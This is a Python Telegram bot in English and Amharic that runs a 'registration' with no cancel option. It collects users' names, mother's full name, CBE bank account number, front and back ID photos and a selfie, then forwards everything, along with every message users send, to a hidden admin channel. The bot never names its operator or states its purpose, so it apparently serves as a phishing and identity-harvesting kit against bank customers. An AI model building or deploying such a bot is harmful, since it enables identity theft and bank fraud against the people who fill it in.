#!/usr/bin/env python3
"""
Telegram Registration Bot — Sequential Flow + Auto-Forward
Bilingual (English + አማርኛ) • Start Button • No Cancel • All to Channel
"""

import os
import sys
import logging
from datetime import datetime, timezone
from threading import Thread

from flask import Flask
from dotenv import load_dotenv
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)
from telegram.constants import ParseMode

# ══════════════════════════
# SETUP
# ══════════════════════════
load_dotenv()

TOKEN = os.getenv("BOT_TOKEN", "")
CHANNEL = os.getenv("ADMIN_CHANNEL_ID", "")
PORT = int(os.getenv("PORT", "10000"))

logging.basicConfig(format="%(asctime)s | %(message)s", level=logging.INFO)
log = logging.getLogger("bot")

if not TOKEN:
    log.critical("BOT_TOKEN missing!")
    sys.exit(1)

# ══════════════════════════
# FLASK FOR RENDER
# ══════════════════════════
flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return "Bot Online"

@flask_app.route("/health")
def health():
    return "OK", 200

# ══════════════════════════
# STATES
# ══════════════════════════
FIRST, LAST, MOTHER, CBE, FRONT, BACK, PHOTO = range(7)

# ══════════════════════════
# CONSTANTS
# ══════════════════════════
BTN_START = "🚀 Start Service | አገልግሎት ጀምር"

# ══════════════════════════
# KEYBOARD
# ══════════════════════════
def start_button():
    return ReplyKeyboardMarkup(
        [[KeyboardButton(BTN_START)]],
        resize_keyboard=True,
        one_time_keyboard=False,
    )

def hide():
    return ReplyKeyboardRemove()

# ══════════════════════════
# MESSAGES
# ══════════════════════════

WELCOME = (
    "🌟 *Welcome! | እንኳን ደህና መጡ!* 🌟\n\n"
    "_Click the button below to start your registration._\n"
    "_እባክዎ ምዝገባዎን ለመጀመር ከታች ያለውን ቁልፍ ይጫኑ።_"
)

PROMPTS = [
    "1️⃣ *First Name | የመጀመሪያ ስም*\n\n_Please enter your first name:_\n_እባክዎ የመጀመሪያ ስምዎን ያስገቡ።_",
    "2️⃣ *Last Name | የአያት ስም*\n\n_Please enter your last name:_\n_እባክዎ የአያት ስምዎን ያስገቡ።_",
    "3️⃣ *Mother's Full Name | የእናት ሙሉ ስም*\n\n_Please enter your mother's full name:_\n_እባክዎ የእናትዎን ሙሉ ስም ያስገቡ።_",
    "4️⃣ *CBE Account Number | የሲቢኢ አካውንት ቁጥር*\n\n_Please enter your CBE Account number:_\n_እባክዎ የሲቢኢ አካውንት ቁጥርዎን ያስገቡ።_",
    "5️⃣ *Front ID | የመታወቂያ ፊት ጎን*\n\n📷 _Please upload photo of the FRONT side of your ID:_\n📷 _እባክዎ የመታወቂያዎን የፊት ጎን ፎቶ ይላኩ።_",
    "6️⃣ *Back ID | የመታወቂያ ጀርባ ጎን*\n\n📷 _Please upload photo of the BACK side of your ID:_\n📷 _እባክዎ የመታወቂያዎን የጀርባ ጎን ፎቶ ይላኩ።_",
    "7️⃣ *Your Photo | የእርስዎ ፎቶ*\n\n📷 _Please upload your personal photo:_\n📷 _እባክዎ የራስዎን ፎቶ ይላኩ።_",
]

ERR_PHOTO = "❌ *Please upload a PHOTO.*\n❌ *እባክዎ ፎቶ ይላኩ።*"

def done(data):
    return (
        "🎉 *Congratulations! | እንኳን ደስ አለዎት!* 🎉\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "✅ *You have finished all processes!*\n"
        "✅ *ሁሉንም ሂደቶች አጠናቀዋል!*\n\n"
        "*Please wait while we cross-check the information you entered:*\n"
        "*እባክዎ ያስገቡትን መረጃ እስክንፈትሽ ይጠብቁ:*\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📋 *First Name | ስም:* {data.get('first_name','')}\n"
        f"📋 *Last Name | የአያት ስም:* {data.get('last_name','')}\n"
        f"👩 *Mother | እናት:* {data.get('mothers_name','')}\n"
        f"🏦 *CBE Account | አካውንት:* {data.get('cbe_account','')}\n\n"
        "📷 *Documents Uploaded | የተላኩ ሰነዶች:*\n"
        "• Front ID | ፊት ጎን ✅\n"
        "• Back ID | ጀርባ ጎን ✅\n"
        "• Personal Photo | ፎቶ ✅\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⏳ *_We will review your information shortly._*\n"
        "⏳ *_መረጃዎን በቅርቡ እንመረምራለን።_*"
    )

def channel_msg(data, uid):
    return (
        "📋 *NEW REGISTRATION | አዲስ ምዝገባ*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔑 *User ID:* `{uid}`\n"
        f"📅 *Date:* {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}\n\n"
        f"📋 *First Name | ስም:* {data.get('first_name','')}\n"
        f"📋 *Last Name | የአያት ስም:* {data.get('last_name','')}\n"
        f"👩 *Mother | እናት:* {data.get('mothers_name','')}\n"
        f"🏦 *CBE | አካውንት:* {data.get('cbe_account','')}\n\n"
        "📷 *Documents Below | ሰነዶች ከዚህ በታች* 👇"
    )

# ══════════════════════════
# AUTO-FORWARD TO CHANNEL
# ══════════════════════════

async def forward_to_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Forward EVERY user message to admin channel."""
    if not CHANNEL or not update.message:
        return

    user = update.effective_user
    uid = user.id
    name = user.full_name
    username = f"@{user.username}" if user.username else "No username"

    try:
        if update.message.text:
            await context.bot.send_message(
                chat_id=CHANNEL,
                text=(
                    f"📩 *Message | መልእክት*\n"
                    f"👤 {name} | `{uid}` | {username}\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"{update.message.text}"
                ),
                parse_mode=ParseMode.MARKDOWN,
            )

        elif update.message.photo:
            caption = update.message.caption or ""
            await context.bot.send_photo(
                chat_id=CHANNEL,
                photo=update.message.photo[-1].file_id,
                caption=(
                    f"📷 *Photo | ፎቶ*\n"
                    f"👤 {name} | `{uid}` | {username}"
                    f"{chr(10) + caption if caption else ''}"
                ),
                parse_mode=ParseMode.MARKDOWN,
            )

        elif update.message.document:
            await context.bot.send_document(
                chat_id=CHANNEL,
                document=update.message.document.file_id,
                caption=f"📄 *Document | ሰነድ*\n👤 {name} | `{uid}`",
                parse_mode=ParseMode.MARKDOWN,
            )

        elif update.message.sticker:
            await context.bot.send_sticker(
                chat_id=CHANNEL,
                sticker=update.message.sticker.file_id,
            )
            await context.bot.send_message(
                chat_id=CHANNEL,
                text=f"🎯 *Sticker | ስቲከር*\n👤 {name} | `{uid}`",
                parse_mode=ParseMode.MARKDOWN,
            )

    except Exception as e:
        log.error(f"Forward error: {e}")


# ══════════════════════════
# HANDLERS
# ══════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /start — Show welcome with button """
    context.user_data.clear()
    await update.message.reply_text(
        WELCOME,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=start_button(),
    )
    log.info(f"/start | User={update.effective_user.id}")
    return ConversationHandler.END


async def btn_start_service(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User clicks Start Service button → Begin sequential flow"""
    if update.message.text != BTN_START:
        return ConversationHandler.END

    context.user_data.clear()
    context.user_data["reg"] = {}

    await update.message.reply_text(
        "📝 *Registration Started! | ምዝገባ ተጀምሯል!*\n\n"
        "_Answer each question one by one._\n"
        "_እያንዳንዱን ጥያቄ አንድ በአንድ ይመልሱ።_",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=hide(),
    )
    await update.message.reply_text(PROMPTS[0], parse_mode=ParseMode.MARKDOWN)
    log.info(f"Start Service | User={update.effective_user.id}")
    return FIRST


async def step_first(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 1: First Name"""
    context.user_data["reg"]["first_name"] = update.message.text.strip()
    log.info(f"Step 1 | User={update.effective_user.id} | {update.message.text}")
    await update.message.reply_text(PROMPTS[1], parse_mode=ParseMode.MARKDOWN)
    return LAST


async def step_last(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 2: Last Name"""
    context.user_data["reg"]["last_name"] = update.message.text.strip()
    log.info(f"Step 2 | User={update.effective_user.id} | {update.message.text}")
    await update.message.reply_text(PROMPTS[2], parse_mode=ParseMode.MARKDOWN)
    return MOTHER


async def step_mother(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 3: Mother's Name"""
    context.user_data["reg"]["mothers_name"] = update.message.text.strip()
    log.info(f"Step 3 | User={update.effective_user.id} | {update.message.text}")
    await update.message.reply_text(PROMPTS[3], parse_mode=ParseMode.MARKDOWN)
    return CBE


async def step_cbe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 4: CBE Account"""
    context.user_data["reg"]["cbe_account"] = update.message.text.strip()
    log.info(f"Step 4 | User={update.effective_user.id} | {update.message.text}")
    await update.message.reply_text(PROMPTS[4], parse_mode=ParseMode.MARKDOWN)
    return FRONT


async def step_front(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 5: Front ID Photo"""
    if not update.message.photo:
        await update.message.reply_text(ERR_PHOTO, parse_mode=ParseMode.MARKDOWN)
        return FRONT

    file = await update.message.photo[-1].get_file()
    context.user_data["reg"]["front_id"] = file.file_id
    log.info(f"Step 5 | User={update.effective_user.id} | Photo received")
    await update.message.reply_text(PROMPTS[5], parse_mode=ParseMode.MARKDOWN)
    return BACK


async def step_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 6: Back ID Photo"""
    if not update.message.photo:
        await update.message.reply_text(ERR_PHOTO, parse_mode=ParseMode.MARKDOWN)
        return BACK

    file = await update.message.photo[-1].get_file()
    context.user_data["reg"]["back_id"] = file.file_id
    log.info(f"Step 6 | User={update.effective_user.id} | Photo received")
    await update.message.reply_text(PROMPTS[6], parse_mode=ParseMode.MARKDOWN)
    return PHOTO


async def step_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 7: Personal Photo → FINISH"""
    if not update.message.photo:
        await update.message.reply_text(ERR_PHOTO, parse_mode=ParseMode.MARKDOWN)
        return PHOTO

    uid = update.effective_user.id
    file = await update.message.photo[-1].get_file()
    context.user_data["reg"]["personal_photo"] = file.file_id
    data = context.user_data["reg"]

    log.info(f"Step 7 | User={uid} | Complete!")

    # ── Show completion ──
    await update.message.reply_text(
        done(data),
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=start_button(),
    )

    # ── Send to channel ──
    if CHANNEL:
        try:
            await context.bot.send_message(
                chat_id=CHANNEL,
                text=channel_msg(data, uid),
                parse_mode=ParseMode.MARKDOWN,
            )
            for key, cap in [
                ("front_id", "📷 Front ID | ፊት ጎን"),
                ("back_id", "📷 Back ID | ጀርባ ጎን"),
                ("personal_photo", "📷 Photo | ፎቶ"),
            ]:
                fid = data.get(key)
                if fid:
                    await context.bot.send_photo(chat_id=CHANNEL, photo=fid, caption=cap)

            log.info(f"✅ Sent to channel | User={uid}")
        except Exception as e:
            log.error(f"Channel error: {e}")

    return ConversationHandler.END


# ══════════════════════════
# BUILD BOT
# ══════════════════════════

def build():
    app = ApplicationBuilder().token(TOKEN).build()

    # Sequential registration flow — triggered by button click
    conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.TEXT & ~filters.COMMAND, btn_start_service),
        ],
        states={
            FIRST:  [MessageHandler(filters.TEXT & ~filters.COMMAND, step_first)],
            LAST:   [MessageHandler(filters.TEXT & ~filters.COMMAND, step_last)],
            MOTHER: [MessageHandler(filters.TEXT & ~filters.COMMAND, step_mother)],
            CBE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, step_cbe)],
            FRONT:  [MessageHandler(filters.PHOTO, step_front)],
            BACK:   [MessageHandler(filters.PHOTO, step_back)],
            PHOTO:  [MessageHandler(filters.PHOTO, step_photo)],
        },
        fallbacks=[],  # No cancel — must complete
        allow_reentry=True,
        per_message=False,
    )

    app.add_handler(conv)
    app.add_handler(CommandHandler("start", cmd_start))

    # ⭐ Auto-forward ALL messages to channel
    app.add_handler(
        MessageHandler(filters.ALL, forward_to_channel),
        group=999,
    )

    return app


# ══════════════════════════
# RUN
# ══════════════════════════

def run_flask():
    flask_app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)


if __name__ == "__main__":
    Thread(target=run_flask, daemon=True).start()
    log.info(f"Health server on port {PORT}")

    bot = build()
    log.info("✅ Bot running — Start Button + Sequential + Auto-forward!")
    bot.run_polling(allowed_updates=Update.ALL_TYPES)